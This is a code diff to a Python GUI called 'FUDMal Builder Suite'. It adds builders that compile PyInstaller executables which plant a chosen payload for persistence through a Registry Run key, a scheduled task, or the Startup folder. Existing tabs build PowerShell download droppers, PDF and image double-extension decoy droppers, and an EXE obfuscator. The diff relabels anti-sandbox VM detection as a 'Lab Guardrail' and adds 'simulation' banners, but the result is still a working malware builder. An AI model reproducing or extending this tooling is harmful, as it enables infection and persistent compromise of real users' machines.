@@ -512,6 +512,380 @@ if __name__ == "__main__":
             if os.path.exists(spec): os.remove(spec)
 
 # =============================================================================
+# SIMULATION CLASSES  (added below LogicObfuscator)
+# =============================================================================
+
+class LogicRegistryPersistence:
+    """Simulates MITRE ATT&CK T1547.001 – Registry Run Keys.
+
+    Generates a compiled exe that, when run in the lab:
+      1. Stages the bundled payload to %APPDATA%\\SimLab\\
+      2. Writes HKCU\\...\\CurrentVersion\\Run pointing to it
+      3. Displays a detailed simulation report popup
+      4. Optionally removes the key (cleanup mode)
+    """
+
+    @staticmethod
+    def build(payload_path, key_name, output_name, output_dir,
+              enable_vm, enable_cleanup, log_widget):
+        sys.stdout = IORedirector(log_widget)
+        sys.stderr = IORedirector(log_widget)
+        print("[INFO] Starting Registry Persistence Simulator Build...")
+        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Registry Run Keys")
+
+        payload_name = os.path.basename(payload_path)
+        vm_code = VM_CHECK_CODE if enable_vm else ""
+        vm_call = (
+            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
+            if enable_vm else ""
+        )
+        cleanup = (
+            """\
+    # --- CLEANUP: remove Run key ---
+    _reg_c = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg_c, 0, winreg.KEY_WRITE) as _hk:
+            winreg.DeleteValue(_hk, REG_VALUE_NAME)
+        lines.append("[CLEANUP] Run key '" + REG_VALUE_NAME + "' deleted.")
+    except Exception as _exc:
+        lines.append("[CLEANUP ERROR] " + str(_exc))
+"""
+            if enable_cleanup else ""
+        )
+
+        script_content = f"""import os, sys, shutil, tempfile, platform, winreg
+import tkinter as tk
+from tkinter import messagebox
+{vm_code}
+PAYLOAD_FILENAME = "{payload_name}"
+REG_VALUE_NAME   = "{key_name}"
+
+def _res(p):
+    try:
+        return os.path.join(sys._MEIPASS, p)
+    except AttributeError:
+        return os.path.join(os.path.abspath("."), p)
+
+def _report(body):
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Sim -- T1547.001 Run Key", body)
+    root.destroy()
+
+def run_simulation():
+{vm_call}
+    if platform.system() != "Windows":
+        _report("[ERROR] Windows-only simulation.")
+        return
+    lines = [
+        "[SIM] Registry Run Key Persistence Simulator",
+        "[SIM] Technique: MITRE ATT&CK T1547.001",
+        "-" * 60,
+    ]
+    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
+    os.makedirs(dest_dir, exist_ok=True)
+    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
+    try:
+        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
+        lines.append("[STEP 1] Payload staged: " + dest_payload)
+    except Exception as _e:
+        lines.append("[ERROR] Stage failed: " + str(_e))
+        dest_payload = _res(PAYLOAD_FILENAME)
+    _reg = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, _reg, 0, winreg.KEY_WRITE) as _hk:
+            winreg.SetValueEx(_hk, REG_VALUE_NAME, 0, winreg.REG_SZ, dest_payload)
+        lines.append("[STEP 2] Registry Run key set:")
+        lines.append("  HKCU\\\\" + _reg + "\\\\" + REG_VALUE_NAME)
+        lines.append("  Value: " + dest_payload)
+        lines.append("[NOTE] Payload executes at next user logon.")
+    except Exception as _e:
+        lines.append("[ERROR] Registry write failed: " + str(_e))
+{cleanup}
+    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")
+
+if __name__ == "__main__":
+    run_simulation()
+"""
+        temp_dir = tempfile.mkdtemp()
+        script_path = os.path.join(temp_dir, "reg_persist_sim.py")
+        try:
+            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
+            with open(script_path, 'w', encoding='utf-8') as fh:
+                fh.write(script_content)
+            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+            base_name  = os.path.splitext(final_name)[0]
+            sep = ';' if sys.platform.startswith('win') else ':'
+            cmd = [
+                'pyinstaller', '--onefile', '--noconsole',
+                '--name', base_name,
+                '--add-data', payload_name + sep + '.',
+                script_path,
+            ]
+            print("[INFO] Compiling...")
+            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
+            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
+            final_dest = os.path.join(output_dir, final_name)
+            shutil.move(dist_exe, final_dest)
+            print(f"[SUCCESS] Simulator created: {final_dest}")
+            messagebox.showinfo("Success", f"Created: {final_dest}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            messagebox.showerror("Error", str(e))
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+
+
+class LogicScheduledTask:
+    """Simulates MITRE ATT&CK T1053.005 – Scheduled Task/Job.
+
+    Generates a compiled exe that, when run in the lab:
+      1. Stages the bundled payload to %APPDATA%\\SimLab\\
+      2. Creates a scheduled task via 'schtasks /Create' (ONLOGON or DAILY)
+      3. Displays a detailed simulation report popup
+      4. Optionally deletes the task (cleanup mode)
+    """
+
+    @staticmethod
+    def build(payload_path, task_name, trigger, output_name, output_dir,
+              enable_vm, enable_cleanup, log_widget):
+        sys.stdout = IORedirector(log_widget)
+        sys.stderr = IORedirector(log_widget)
+        print("[INFO] Starting Scheduled Task Simulator Build...")
+        print("[INFO] Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job")
+
+        payload_name  = os.path.basename(payload_path)
+        vm_code = VM_CHECK_CODE if enable_vm else ""
+        vm_call = (
+            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
+            if enable_vm else ""
+        )
+        cleanup = (
+            """\
+    # --- CLEANUP: delete the scheduled task ---
+    try:
+        _del = subprocess.run(
+            ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"],
+            capture_output=True, text=True,
+        )
+        if _del.returncode == 0:
+            lines.append("[CLEANUP] Task '" + TASK_NAME + "' deleted.")
+        else:
+            lines.append("[CLEANUP ERROR] " + _del.stderr.strip())
+    except Exception as _exc:
+        lines.append("[CLEANUP ERROR] " + str(_exc))
+"""
+            if enable_cleanup else ""
+        )
+        trigger_upper = trigger.upper()
+
+        script_content = f"""import os, sys, shutil, tempfile, platform, subprocess
+import tkinter as tk
+from tkinter import messagebox
+{vm_code}
+PAYLOAD_FILENAME = "{payload_name}"
+TASK_NAME        = "{task_name}"
+TRIGGER          = "{trigger_upper}"
+
+def _res(p):
+    try:
+        return os.path.join(sys._MEIPASS, p)
+    except AttributeError:
+        return os.path.join(os.path.abspath("."), p)
+
+def _report(body):
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Sim -- T1053.005 Scheduled Task", body)
+    root.destroy()
+
+def run_simulation():
+{vm_call}
+    if platform.system() != "Windows":
+        _report("[ERROR] Windows-only simulation.")
+        return
+    lines = [
+        "[SIM] Scheduled Task Persistence Simulator",
+        "[SIM] Technique: MITRE ATT&CK T1053.005",
+        "-" * 60,
+    ]
+    dest_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "SimLab")
+    os.makedirs(dest_dir, exist_ok=True)
+    dest_payload = os.path.join(dest_dir, PAYLOAD_FILENAME)
+    try:
+        shutil.copy2(_res(PAYLOAD_FILENAME), dest_payload)
+        lines.append("[STEP 1] Payload staged: " + dest_payload)
+    except Exception as _e:
+        lines.append("[ERROR] Stage failed: " + str(_e))
+        dest_payload = _res(PAYLOAD_FILENAME)
+    if TRIGGER == "ONLOGON":
+        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
+                "/TR", dest_payload, "/SC", "ONLOGON", "/F"]
+    else:
+        _cmd = ["schtasks", "/Create", "/TN", TASK_NAME,
+                "/TR", dest_payload, "/SC", "DAILY", "/ST", "09:00", "/F"]
+    try:
+        _r = subprocess.run(_cmd, capture_output=True, text=True)
+        if _r.returncode == 0:
+            lines.append("[STEP 2] Scheduled task created:")
+            lines.append("  Name:    " + TASK_NAME)
+            lines.append("  Trigger: /SC " + TRIGGER)
+            lines.append("  Command: " + dest_payload)
+            lines.append("[NOTE] Task executes payload per the defined schedule.")
+        else:
+            lines.append("[ERROR] schtasks failed: " + _r.stderr.strip())
+    except Exception as _e:
+        lines.append("[ERROR] " + str(_e))
+{cleanup}
+    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")
+
+if __name__ == "__main__":
+    run_simulation()
+"""
+        temp_dir = tempfile.mkdtemp()
+        script_path = os.path.join(temp_dir, "schtask_sim.py")
+        try:
+            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
+            with open(script_path, 'w', encoding='utf-8') as fh:
+                fh.write(script_content)
+            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+            base_name  = os.path.splitext(final_name)[0]
+            sep = ';' if sys.platform.startswith('win') else ':'
+            cmd = [
+                'pyinstaller', '--onefile', '--noconsole',
+                '--name', base_name,
+                '--add-data', payload_name + sep + '.',
+                script_path,
+            ]
+            print("[INFO] Compiling...")
+            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
+            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
+            final_dest = os.path.join(output_dir, final_name)
+            shutil.move(dist_exe, final_dest)
+            print(f"[SUCCESS] Simulator created: {final_dest}")
+            messagebox.showinfo("Success", f"Created: {final_dest}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            messagebox.showerror("Error", str(e))
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+
+
+class LogicStartupFolder:
+    """Simulates MITRE ATT&CK T1547.001 via the Windows Startup Folder.
+
+    Generates a compiled exe that, when run in the lab:
+      1. Resolves the current-user Startup folder path
+      2. Copies the bundled payload into that folder
+      3. Displays a detailed simulation report popup
+      4. Optionally removes the file (cleanup mode)
+    """
+
+    @staticmethod
+    def build(payload_path, output_name, output_dir,
+              enable_vm, enable_cleanup, log_widget):
+        sys.stdout = IORedirector(log_widget)
+        sys.stderr = IORedirector(log_widget)
+        print("[INFO] Starting Startup Folder Simulator Build...")
+        print("[INFO] Technique: MITRE ATT&CK T1547.001 - Startup Folder")
+
+        payload_name = os.path.basename(payload_path)
+        vm_code = VM_CHECK_CODE if enable_vm else ""
+        vm_call = (
+            "    if is_running_on_vmware_windows():\n        sys.exit(0)"
+            if enable_vm else ""
+        )
+        cleanup = (
+            """\
+    # --- CLEANUP: remove payload from Startup folder ---
+    _dest_c = os.path.join(startup_dir, PAYLOAD_FILENAME)
+    try:
+        if os.path.exists(_dest_c):
+            os.remove(_dest_c)
+        lines.append("[CLEANUP] Removed: " + _dest_c)
+    except Exception as _exc:
+        lines.append("[CLEANUP ERROR] " + str(_exc))
+"""
+            if enable_cleanup else ""
+        )
+
+        script_content = f"""import os, sys, shutil, tempfile, platform
+import tkinter as tk
+from tkinter import messagebox
+{vm_code}
+PAYLOAD_FILENAME = "{payload_name}"
+
+def _res(p):
+    try:
+        return os.path.join(sys._MEIPASS, p)
+    except AttributeError:
+        return os.path.join(os.path.abspath("."), p)
+
+def _report(body):
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Sim -- T1547.001 Startup Folder", body)
+    root.destroy()
+
+def run_simulation():
+{vm_call}
+    if platform.system() != "Windows":
+        _report("[ERROR] Windows-only simulation.")
+        return
+    lines = [
+        "[SIM] Startup Folder Persistence Simulator",
+        "[SIM] Technique: MITRE ATT&CK T1547.001 (Startup Folder)",
+        "-" * 60,
+    ]
+    startup_dir = os.path.join(
+        os.environ.get("APPDATA", ""),
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
+    )
+    lines.append("[STEP 1] Startup folder: " + startup_dir)
+    dest_path = os.path.join(startup_dir, PAYLOAD_FILENAME)
+    try:
+        shutil.copy2(_res(PAYLOAD_FILENAME), dest_path)
+        lines.append("[STEP 2] Payload copied to startup folder:")
+        lines.append("         " + dest_path)
+        lines.append("[NOTE] Payload executes automatically at next user logon.")
+    except Exception as _e:
+        lines.append("[ERROR] Copy failed: " + str(_e))
+{cleanup}
+    _report("\\n".join(lines) + "\\n\\n[LAB] Authorized defensive training simulation only.")
+
+if __name__ == "__main__":
+    run_simulation()
+"""
+        temp_dir = tempfile.mkdtemp()
+        script_path = os.path.join(temp_dir, "startup_sim.py")
+        try:
+            shutil.copy2(payload_path, os.path.join(temp_dir, payload_name))
+            with open(script_path, 'w', encoding='utf-8') as fh:
+                fh.write(script_content)
+            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+            base_name  = os.path.splitext(final_name)[0]
+            sep = ';' if sys.platform.startswith('win') else ':'
+            cmd = [
+                'pyinstaller', '--onefile', '--noconsole',
+                '--name', base_name,
+                '--add-data', payload_name + sep + '.',
+                script_path,
+            ]
+            print("[INFO] Compiling...")
+            subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
+            dist_exe   = os.path.join(temp_dir, 'dist', base_name + '.exe')
+            final_dest = os.path.join(output_dir, final_name)
+            shutil.move(dist_exe, final_dest)
+            print(f"[SUCCESS] Simulator created: {final_dest}")
+            messagebox.showinfo("Success", f"Created: {final_dest}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            messagebox.showerror("Error", str(e))
+        finally:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+
+
+# =============================================================================
 # MAIN GUI APPLICATION
 # =============================================================================
 
@@ -519,7 +893,7 @@ class UnifiedBuilderApp(tk.Tk):
     def __init__(self):
         super().__init__()
         self.title("FUDMal Builder Suite")
-        self.geometry("800x750")
+        self.geometry("920x800")
         self.configure(bg='#1A1A1A')
         
         self.style = ttk.Style(self)
@@ -534,6 +908,9 @@ class UnifiedBuilderApp(tk.Tk):
         self.init_sfx_tab()
         self.init_obfus_tab()
         self.init_pdf_tab()
+        self.init_reg_persist_tab()
+        self.init_schtask_tab()
+        self.init_startup_tab()
 
     def _configure_styles(self):
         self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
@@ -577,6 +954,15 @@ class UnifiedBuilderApp(tk.Tk):
         ttk.Button(f, text=btn_txt, command=browse, width=8).pack(side=tk.LEFT)
         return var
 
+    def add_label_combobox(self, parent, text, values, default=None):
+        f = ttk.Frame(parent)
+        f.pack(fill='x', pady=5)
+        ttk.Label(f, text=text, width=25).pack(side=tk.LEFT, anchor='w')
+        var = tk.StringVar(value=default or values[0])
+        cb = ttk.Combobox(f, textvariable=var, values=values, state='readonly', width=20)
+        cb.pack(side=tk.LEFT, padx=5)
+        return var
+
     def create_log_area(self, parent):
         ttk.Label(parent, text="Process Log:", foreground='#888').pack(pady=(10,0), anchor='w')
         f = ttk.Frame(parent)
@@ -593,7 +979,9 @@ class UnifiedBuilderApp(tk.Tk):
         tab = ttk.Frame(self.notebook, padding=20)
         self.notebook.add(tab, text="Dropper Gen")
         
-        ttk.Label(tab, text="PowerShell Config Dropper", font=('Consolas', 14, 'bold')).pack(pady=(0,15))
+        ttk.Label(tab, text="PowerShell Config Dropper", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: T1059.001 (PowerShell)  |  T1105 (Ingress Tool Transfer)",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
         
         self.c_url = self.add_label_entry(tab, "Source URL:", "http://192.168.146.129:8000/base.exe")
         self.c_path = self.add_label_entry(tab, "Install Path:", "Downloads\\")
@@ -611,7 +999,7 @@ class UnifiedBuilderApp(tk.Tk):
         self.c_d_wait.pack(side=tk.LEFT, padx=5)
 
         self.c_vm = tk.BooleanVar(value=False)
-        ttk.Checkbutton(tab, text="Enable Anti-Sandbox (VM Detection)", variable=self.c_vm).pack(anchor='w', pady=10)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.c_vm).pack(anchor='w', pady=10)
 
         ttk.Button(tab, text="GENERATE .EXE", command=self.run_config_gen).pack(fill='x', pady=10)
         self.c_log = self.create_log_area(tab)
@@ -639,7 +1027,9 @@ class UnifiedBuilderApp(tk.Tk):
         tab = ttk.Frame(self.notebook, padding=20)
         self.notebook.add(tab, text="SFX Builder")
         
-        ttk.Label(tab, text="SFX Decoy Dropper (Img/Doc)", font=('Consolas', 14, 'bold')).pack(pady=(0,15))
+        ttk.Label(tab, text="SFX Decoy Dropper (Img/Doc)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
         
         self.s_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
         self.s_decoy = self.add_file_selector(tab, "Decoy File:", False, [("All", "*.*")])
@@ -647,7 +1037,7 @@ class UnifiedBuilderApp(tk.Tk):
         self.s_dir = self.add_file_selector(tab, "Output Dir:", True)
         
         self.s_vm = tk.BooleanVar(value=False)
-        ttk.Checkbutton(tab, text="Enable Anti-Sandbox (VM Detection)", variable=self.s_vm).pack(anchor='w', pady=10)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.s_vm).pack(anchor='w', pady=10)
 
         ttk.Button(tab, text="BUILD SFX", command=self.run_sfx).pack(fill='x', pady=10)
         self.s_log = self.create_log_area(tab)
@@ -666,7 +1056,9 @@ class UnifiedBuilderApp(tk.Tk):
         tab = ttk.Frame(self.notebook, padding=20)
         self.notebook.add(tab, text="Obfuscator")
         
-        ttk.Label(tab, text="Custom Cipher EXE Encoder", font=('Consolas', 14, 'bold')).pack(pady=(0,15))
+        ttk.Label(tab, text="Custom Cipher EXE Encoder", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: T1027 (Obfuscated Files or Information)",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
         
         self.o_exe = self.add_file_selector(tab, "Original EXE:", False, [("EXE", "*.exe")])
         self.o_key = self.add_label_entry(tab, "Version Key:", "1.0.0")
@@ -674,7 +1066,7 @@ class UnifiedBuilderApp(tk.Tk):
         self.o_dir = self.add_file_selector(tab, "Output Dir:", True)
 
         self.o_vm = tk.BooleanVar(value=False)
-        ttk.Checkbutton(tab, text="Enable Anti-Sandbox (VM Detection)", variable=self.o_vm).pack(anchor='w', pady=10)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.o_vm).pack(anchor='w', pady=10)
 
         ttk.Button(tab, text="ENCRYPT & BUILD", command=self.run_obfus).pack(fill='x', pady=10)
         self.o_log = self.create_log_area(tab)
@@ -693,7 +1085,9 @@ class UnifiedBuilderApp(tk.Tk):
         tab = ttk.Frame(self.notebook, padding=20)
         self.notebook.add(tab, text="PDF Dropper")
         
-        ttk.Label(tab, text="PDF Decoy Dropper (Req: pdf.ico)", font=('Consolas', 14, 'bold')).pack(pady=(0,15))
+        ttk.Label(tab, text="PDF Decoy Dropper (Req: pdf.ico)", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: T1036.007 (Double File Extension Masquerading)",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
         
         self.p_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
         self.p_decoy = self.add_file_selector(tab, "Decoy PDF:", False, [("PDF", "*.pdf")])
@@ -701,7 +1095,7 @@ class UnifiedBuilderApp(tk.Tk):
         self.p_dir = self.add_file_selector(tab, "Output Dir:", True)
 
         self.p_vm = tk.BooleanVar(value=False)
-        ttk.Checkbutton(tab, text="Enable Anti-Sandbox (VM Detection)", variable=self.p_vm).pack(anchor='w', pady=10)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.p_vm).pack(anchor='w', pady=10)
 
         ttk.Button(tab, text="BUILD PDF DROPPER", command=self.run_pdf).pack(fill='x', pady=10)
         self.p_log = self.create_log_area(tab)
@@ -717,6 +1111,106 @@ class UnifiedBuilderApp(tk.Tk):
         threading.Thread(target=LogicSFX.build, # Reusing SFX logic with is_pdf_mode=True
                          args=(self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), 
                                self.p_dir.get(), self.p_vm.get(), self.p_log, True)).start()
+
+    # --- TAB 5: REGISTRY PERSISTENCE SIMULATOR ---
+    def init_reg_persist_tab(self):
+        tab = ttk.Frame(self.notebook, padding=20)
+        self.notebook.add(tab, text="Reg Persist")
+
+        ttk.Label(tab, text="Registry Run Key Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
+
+        self.rp_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
+        self.rp_key     = self.add_label_entry(tab, "Registry Key Name:", "SimPersistenceKey")
+        self.rp_name    = self.add_label_entry(tab, "Output Name:", "RegPersistSim.exe")
+        self.rp_dir     = self.add_file_selector(tab, "Output Dir:", True)
+
+        self.rp_vm      = tk.BooleanVar(value=False)
+        self.rp_cleanup = tk.BooleanVar(value=True)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.rp_vm).pack(anchor='w', pady=3)
+        ttk.Checkbutton(tab, text="Enable Cleanup (remove key after simulation)", variable=self.rp_cleanup).pack(anchor='w', pady=3)
+
+        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_reg_persist).pack(fill='x', pady=10)
+        self.rp_log = self.create_log_area(tab)
+
+    def run_reg_persist(self):
+        if not all([self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(), self.rp_dir.get()]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
+        self.rp_log.delete(1.0, tk.END)
+        threading.Thread(
+            target=LogicRegistryPersistence.build,
+            args=(self.rp_payload.get(), self.rp_key.get(), self.rp_name.get(),
+                  self.rp_dir.get(), self.rp_vm.get(), self.rp_cleanup.get(), self.rp_log)
+        ).start()
+
+    # --- TAB 6: SCHEDULED TASK SIMULATOR ---
+    def init_schtask_tab(self):
+        tab = ttk.Frame(self.notebook, padding=20)
+        self.notebook.add(tab, text="Sched Task")
+
+        ttk.Label(tab, text="Scheduled Task Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: MITRE ATT&CK T1053.005 - Scheduled Task/Job",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
+
+        self.st_payload  = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
+        self.st_taskname = self.add_label_entry(tab, "Task Name:", "SimTaskDemo")
+        self.st_trigger  = self.add_label_combobox(tab, "Trigger:", ["ONLOGON", "DAILY"], "ONLOGON")
+        self.st_name     = self.add_label_entry(tab, "Output Name:", "SchedTaskSim.exe")
+        self.st_dir      = self.add_file_selector(tab, "Output Dir:", True)
+
+        self.st_vm      = tk.BooleanVar(value=False)
+        self.st_cleanup = tk.BooleanVar(value=True)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.st_vm).pack(anchor='w', pady=3)
+        ttk.Checkbutton(tab, text="Enable Cleanup (delete task after simulation)", variable=self.st_cleanup).pack(anchor='w', pady=3)
+
+        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_schtask).pack(fill='x', pady=10)
+        self.st_log = self.create_log_area(tab)
+
+    def run_schtask(self):
+        if not all([self.st_payload.get(), self.st_taskname.get(), self.st_name.get(), self.st_dir.get()]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
+        self.st_log.delete(1.0, tk.END)
+        threading.Thread(
+            target=LogicScheduledTask.build,
+            args=(self.st_payload.get(), self.st_taskname.get(), self.st_trigger.get(),
+                  self.st_name.get(), self.st_dir.get(), self.st_vm.get(),
+                  self.st_cleanup.get(), self.st_log)
+        ).start()
+
+    # --- TAB 7: STARTUP FOLDER SIMULATOR ---
+    def init_startup_tab(self):
+        tab = ttk.Frame(self.notebook, padding=20)
+        self.notebook.add(tab, text="Startup Folder")
+
+        ttk.Label(tab, text="Startup Folder Persistence Sim", font=('Consolas', 14, 'bold')).pack(pady=(0,4))
+        ttk.Label(tab, text="Technique: MITRE ATT&CK T1547.001 - Startup Folder",
+                  foreground='#555', font=('Consolas', 8)).pack(pady=(0,10))
+
+        self.sf_payload = self.add_file_selector(tab, "Payload EXE:", False, [("EXE", "*.exe")])
+        self.sf_name    = self.add_label_entry(tab, "Output Name:", "StartupSim.exe")
+        self.sf_dir     = self.add_file_selector(tab, "Output Dir:", True)
+
+        self.sf_vm      = tk.BooleanVar(value=False)
+        self.sf_cleanup = tk.BooleanVar(value=True)
+        ttk.Checkbutton(tab, text="Enable Lab Guardrail (VM Detection)", variable=self.sf_vm).pack(anchor='w', pady=3)
+        ttk.Checkbutton(tab, text="Enable Cleanup (remove from startup folder after sim)", variable=self.sf_cleanup).pack(anchor='w', pady=3)
+
+        ttk.Button(tab, text="BUILD SIMULATOR", command=self.run_startup).pack(fill='x', pady=10)
+        self.sf_log = self.create_log_area(tab)
+
+    def run_startup(self):
+        if not all([self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get()]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
+        self.sf_log.delete(1.0, tk.END)
+        threading.Thread(
+            target=LogicStartupFolder.build,
+            args=(self.sf_payload.get(), self.sf_name.get(), self.sf_dir.get(),
+                  self.sf_vm.get(), self.sf_cleanup.get(), self.sf_log)
+        ).start()
 
 if __name__ == "__main__":
     app = UnifiedBuilderApp()
